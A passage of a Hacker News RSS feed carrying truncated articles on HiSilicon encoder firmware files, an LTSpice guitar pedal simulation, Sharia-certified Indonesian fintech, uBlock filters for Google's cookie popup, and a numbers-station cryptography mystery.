‚îÇ   ‚îú‚îÄ‚îÄ logs
‚îÇ   ‚îî‚îÄ‚îÄ sbin
‚îî‚îÄ‚îÄ web
    ‚îú‚îÄ‚îÄ css
    ‚îú‚îÄ‚îÄ images
    ‚îú‚îÄ‚îÄ js
    ‚îî‚îÄ‚îÄ player
        ‚îî‚îÄ‚îÄ icons
</code></pre></div></div>

<ul>
  <li><code>disk</code>: empty</li>
  <li><code>ko</code>: kernel modules (device drivers)</li>
  <li><code>lib</code>: empty</li>
  <li><code>nginx</code>: nginx executables and configuration</li>
  <li><code>web</code>: static content (html, js, css‚Ä¶)</li>
</ul>

<p>The most important things are in the root of the archive:</p>

<div><div><pre><code>$ ls -l
total 12756
-rw------- 1 root root     307 Jul 14 08:31 box.ini
-rw------- 1 root root 6533364 Jul 14 08:31 box.v400_hdmi
drwx------ 2 root root    4096 Jul 14 08:31 disk
-rw------- 1 root root 2972924 Jul 14 08:31 font.ttf
-rw------- 1 root root 1570790 Jul 14 08:31 hostapd
-rw------- 1 root root    1847 Jul 14 08:31 hostapd.conf
drwx------ 3 root root    4096 Jul 14 08:31 ko
drwx------ 2 root root    4096 Jul 14 08:31 lib
drwx------ 6 root root    4096 Jul 14 08:31 nginx
-rw------- 1 root root 1382400 Jul 14 08:31 nosig.yuv
-rw------- 1 root root      38 Jul 14 08:31 passwd
-rw------- 1 root root  211248 Jul 14 08:31 png2bmp
-rw------- 1 root root   19213 Jul 14 08:30 remserial
-rw------- 1 root root    6624 Jul 14 08:30 reset
-rw------- 1 root root     968 Jul 14 08:30 run
-rw------- 1 root root     878 Jul 14 08:30 udhcpc.script
-rw------- 1 root root     191 Jul 14 08:30 udhcpd.conf
drwx------ 6 root root    4096 Jul 14 08:31 web
-rw------- 1 root root   39166 Jul 14 08:31 wpa_cli
-rw------- 1 root root  264069 Jul 14 08:31 wpa_supplicant
</code></pre></div></div>

<p>In addition to some general utilities ( <code>hostapd</code>, <code>png2bmp</code>, <code>remserial</code>, <code>wpa_cli</code>, <code>wpa_supplicant</code>) it contains the custom web application <code>box.v400_hdmi</code> which is a compiled binary:</p>

<div><div><pre><code>$ file box.v400_hdmi 
box.v400_hdmi: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
</code></pre></div></div>

<p><strong>This executable is the primary target of my research, and ‚Ä¶</strong></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</a></em></p>]]>
            </description>
            <link>https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516453</guid>
            <pubDate>Fri, 18 Sep 2020 13:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating the ProCo Rat Distortion Pedal in LTSpice]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516227">thread link</a>) | @cushychicken
<br/>
September 18, 2020 | http://cushychicken.github.io/ltspice-proco-rat/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/ltspice-proco-rat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It‚Äôs been a long time since I‚Äôve done <a href="http://cushychicken.github.io/posts/ltspice-tube-screamer/">a pedal simulation</a>, and, well, quarantine times are as good a time as any to fill time with LTSpice simulation. Since Radiohead is a too-appropirate soundtrack for the time in which we live, and Thom Yorke is a famous user, why not simulate the ProCO RAT distortion pedal?</p><p>If you‚Äôd like to follow along at home, I‚Äôve put <a href="https://github.com/Cushychicken/ltspice-guitar-pedals/tree/master/proco-rat-distortion">the LTSpice file on GitHub</a>. Find any errors? Got any neat mods you‚Äôd like to include? Please, submit a pull request!</p><p>You may need to rustle up a diode model for the 1N914 to run - it is not one of the models included in the LTSpice install.</p><p>Here‚Äôs the whole schematic, labeled for clarity:</p><p><img src="http://cushychicken.github.io/assets/images/proco_rat_whole_schematic" alt="Whole Schematic"></p><p>The interesting stuff is largely concentrated in the clipping, tone, and output stages.</p><p>The clipping stage is formed by a LM308 opamp in a noninverting configuration. R2 biases the input at 4.5[V] for maximum dynamic range in the opamp output - i.e., halfway between the 9V rail and GND. Feedback gain is set by potentiometer R9. When shorted to 0[ohm], it reduces the clipping stage to a simple opamp follower (gain=1). When set to a maximum, gain of the amp in signal bands is: \(Gain = 1 + \frac{Rgain}{(560 || 47)} = ~2300 [V/V] = ~67[dB]\) This is more than enough gain to drive to the opamp rail for even a gentle input signal. Fed raw into a guitar amplifier, this signal would completely saturate the input. That‚Äôs where the D2/D3 diode clipping pair come in to play. (Note, though, that the input saturation is desirable to some users. A common modification to this pedal is to remove D2/D3, and rely solely on opamp clipping. This yields a volume boost, and crunchier tone.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433482578.png" alt="Clipping Stage"></p><p>The AC coupling network of C10/R10 works to shift the signal back to a DC balanced square wave. D2/D3 serve to clip the signal down to a more modest +/-0.65[V].</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433524694.png" alt="Input vs Opamp Output vs Clipping Diodes"></p><p>This is slightly more interesting when you move into the frequency domain, however. The net effect, as the gain increases, is to emphasize the 1kHz band of the guitar - ideally, to cut through the mix of a band. (A rock band, that is - not a frequency band.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433598206.png" alt="Image"></p><p>Note that all of these traces converge to the same rolloff asymptote. That‚Äôs the limitation imposed by the LM308‚Äôs output slew rate. At higher gain, the opamp can‚Äôt switch any faster, which limits the response of higher frequencies as the gain increases.</p><p>The tone control is remarkably simple - just a first order RC filter, with potentiometer R17 to allow the user to set the rolloff frequency.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433644991.png" alt="Tone RC Filter"></p><p>R15 and C11 set a limit of the RC filter of the tone stage at about 32kHz. Increasing pot R17 moves that corner frequency lower and lower, until bottoming out at 475Hz. This filter effectively smooths the square wave into progressively softer edges. As R17 increases, the transitions get less square, and closer to a triangular wave.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433664315.png" alt="Image"></p><p>This is my estimate of who lies where on the tone curve, based on a subset of <a href="https://en.wikipedia.org/wiki/Pro_Co_RAT#Notable_users">Wikipedia‚Äôs list of RAT users</a>:</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433692230.png" alt="Clipping vs Users"></p><p>The output driver is also relatively simple - just a JFET follower, with a simple RC filter serving as a highpass filter for volume control. As R14 decreases in resistance, so does the output volume.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433718430.png" alt="Image"></p><ul><li>Increasing the compensation capacitor of the LM308 opamp (C1 in our schematic) has some interesting properties. Increasing this to 300pF creates a softer transition to the opamp railing out, which yields an overall softer clip - fewer higher harmonics. An alternative design, for a less harsh clip.</li><li>Increasing the compensation cap higher proves problematic - or interesting, depending on your viewpoint. Increasing C1 to 3nF yields a gentle oscillation in the opamp output. This could make for some wacky mixed frequency effects. Might be a fun thing to wire up and see what happens.</li><li>Different diodes for D2/D3 could also change the clipping profile, and the harshness of the clip.</li></ul><p><a href="https://www.electrosmash.com/proco-rat">ElectroSmash</a>, of course, is the vanguard of guitar pedal EE knowhow. I used their page of schematics and simulation output as a sanity check that I got all of this right.</p><p>You can see the slew rate limitation of the LM308 in <a href="https://www.analog.com/media/en/technical-documentation/data-sheets/lt0108.pdf">the datasheet</a>. Gain/bandwidth product is on page 4, under ‚ÄúOpen Loop Frequency Response‚Äù.</p></div></div>]]>
            </description>
            <link>http://cushychicken.github.io/ltspice-proco-rat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516227</guid>
            <pubDate>Fri, 18 Sep 2020 13:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital banking, now halal]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 109 (<a href="https://news.ycombinator.com/item?id=24516141">thread link</a>) | @jbegley
<br/>
September 18, 2020 | https://restofworld.org/2020/now-serving-halal-apps/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/now-serving-halal-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia‚Äôs 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council‚Äôs influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma‚Äôruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">‚ÄúShariatization‚Äù of the economy</a> ‚Äî i.e., the growth of digital financial services catering to Muslim users ‚Äî a priority for the country‚Äôs development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users ‚Äî whether peer-to-peer lending apps, mobile money services, or online stock-trading portals ‚Äî MUI acts as the arbiter of their religious legitimacy. MUI‚Äôs National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council‚Äôs combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI‚Äôs religious scholars become embedded in the early evolution of a company‚Äôs digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-40x85.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-541x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-Sharia-Services-introduction-e1599232724418-400x850.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it‚Äôs one of the country‚Äôs largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek‚Äôs digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja‚Äôs team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia‚Äôs largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



<p>Some clerics have argued that <a href="http://www.ikim.gov.my/new-wp/index.php/2019/08/22/some-sharia-considerations-concerning-e-wallet/">digital wallets are a form of <em>haram</em></a>, a term for practices forbidden by Islamic law<em>. </em>The<em> </em>digital-only cash-back rebates and other discounts with partner retailers commonly found on these apps are considered, by some clerics, a form of interest payment between businesses ‚Äî riba in disguise. MUI has ruled sending and storing money in digital wallets acceptable, but only under strict terms.&nbsp;</p>



<figure><blockquote><p>To earn a certificate, new startups must adhere to the council‚Äôs combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech.</p></blockquote></figure>



<p>After conducting a rigorous product-proposal review, MUI appointed a three-member supervisory board to Djaenudin‚Äôs team well-versed in the nuances of its rulings. The board included Anwar Abbas, chairman of an Islamic reformist organization in Southern Java‚Äôs Yogyakarta and author of a national bestseller promoting the vice president‚Äôs ‚ÄúShariatization‚Äù worldview, <a href="https://www.tokopedia.com/dojobuku/ma-ruf-amin-way-sahala-panggabean-by-anwar-abbas"><em>The Ma‚Äôruf Amin Way</em></a><em>. </em>‚ÄúThey are all Sharia experts,‚Äù said Djaenudin. ‚ÄúThey gave us guidance and consultations about the product.‚Äù </p>



<p>Starting in November 2019, shortly after the vice president‚Äôs Shariatization initiative, Djaenudin was required to brief these scholars on market research, product testing, and the ins and outs of engineering every month. MUI‚Äôs supervisory board would share their insights and ensure the technological infrastructure of the app followed MUI‚Äôs rulings.&nbsp;</p>



<p>An MUI fatwa issued in 2017 was of particular concern to Djaenudin. <a href="https://drive.google.com/file/d/1KPAvhhziJ61Pt8EFxxTFfDPNmRHJoQDG/view">Fatwa No. 116</a> begins with verses from the Quran published in both classical Arabic script and Bahasa Indonesian. ‚ÄúO you who have believed, when you contract a debt for a specified term, write it down. And let a scribe write it between you in justice,‚Äù reads one verse. They are followed closely by <a href="https://yaqeeninstitute.org/emadhamdeh/are-hadith-necessary/">quotations from books of <em>hadith</em></a>, records of the sayings of the Prophet Muhammad: ‚ÄúDo not sell gold for gold, and do not sell silver for silver, except in case of like for like.‚Äù</p>



<p>These threads of theological precedent are woven together to create a set of rulings reinterpreting classical verse for the new digital economy. According to the fatwa, these Quranic lines have a specific implication for fintech: floating funds must be housed in certified Islamic banks. Contracts between all parties ‚Äî users, banking institutions, or the app itself ‚Äî must be grounded in Sharia contract law. Any promotional campaign cannot include riba.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-40x23.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/Fintech-400x232.png 400w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-600x348.png 600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1000x580.png 1000w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-1600x928.png 1600w, https://restofworld.org/wp-content/uploads/2020/09/Fintech-2800x1623.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>The supervisory board had other suggestions for LinkAja‚Äôs parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one‚Äôs total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja‚Äôs operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. ‚ÄúFrom the customer‚Äôs perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,‚Äù said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. ‚ÄúIt‚Äôs been almost nine years, and I‚Äôm learning all of this from the day I started my business,‚Äù he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. ‚ÄúSome customers, they ask, ‚ÄòAre you certified, or are you just Sharia?‚Äô‚Äù&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-40x86.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-538x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-400x857.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps ‚Äî waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/now-serving-halal-apps/">https://restofworld.org/2020/now-serving-halal-apps/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/now-serving-halal-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516141</guid>
            <pubDate>Fri, 18 Sep 2020 12:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting rid of the Google cookie consent popup]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24515998">thread link</a>) | @edward
<br/>
September 18, 2020 | https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html | <a href="https://web.archive.org/web/*/https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
    
        <nav id="primary-nav">
        

        <ul><li><a href="https://daniel-lange.com/">Blog</a></li><li><a href="https://daniel-lange.com/pages/software.html">Software</a></li><li><a href="https://daniel-lange.com/pages/contact.html">Contact</a></li></ul>
    </nav>
        <div>
        <main id="content">
        
            <article id="post_164">
        <header>
            <h2><a href="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">Getting rid of the Google cookie consent popup</a></h2>

            
        </header>

        <div>
        <p><a href="https://daniel-lange.com/categories/18-Internet"><img title="Internet: Remember ... all I'm offering is the truth. Nothing more. (Morpheus to Neo who is choosing the red pill)" alt="Internet" src="https://daniel-lange.com/uploads/http.serendipityThumb.jpg"></a></p><p>If you clear your browser cookies regularly (as you should do), Google will annoy you with a full screen cookie consent overlay these days. And - of course - there is no "no tracking consent, technically required cookies only" button. You may log in to Google to set your preference. Yeah, I'm sure this is totally following the intent of the <a href="https://eur-lex.europa.eu/eli/dir/2009/136/2009-12-19">EU Directive 2009/136/EC</a> (the "cookie law").</p>

<p><!-- s9ymdb:664 --><img width="1332" height="1066" src="https://daniel-lange.com/uploads/entries/200918_Google_cookie_consent_screen.png" alt="Google cookie consent pop-up"></p>

<p>Unfortunately none of the big "anti-annoyances" filter lists seem to have picked that one up yet but the friendly folks from the <a href="https://www.computerbase.de/forum/threads/google-nervt-bevor-sie-fortfahren.1968809/">Computerbase Forum</a> [German] to the rescue. User "Sepp Depp" has created the following filter set that <abbr title="Works For Me">WFM</abbr>:</p>

<p>Add this to your <a href="https://github.com/gorhill/uBlock">uBlock Origin</a> "My filters" tab:</p>

<pre>! Google - remove cookie-consent-popup and restore scoll functionality
google.*##.wwYr3.aID8W.bErdLd
google.*##.aID8W.m114nf.t7xA6
google.*##div[jsname][jsaction^="dg_close"]
google.*##html:style(overflow: visible !important;)
google.*##.widget-consent-fullscreen.widget-consent
</pre>

                </div>
                
        

        <!--
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
        <rdf:Description
                 rdf:about="https://daniel-lange.com/feeds/ei_164.rdf"
                 trackback:ping="https://daniel-lange.com/comment.php?type=trackback&amp;entry_id=164"
                 dc:title="Getting rid of the Google cookie consent popup"
                 dc:identifier="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html" />
        </rdf:RDF>
        -->

                                            
        

        
            <a id="feedback"></a>
                        

        
    </article>
        



        </main>
                
        </div>

    
</div></div>]]>
            </description>
            <link>https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515998</guid>
            <pubDate>Fri, 18 Sep 2020 12:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Did a broken random number generator in Cuba help expose a Russian spy network?]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24515717">thread link</a>) | @privong
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
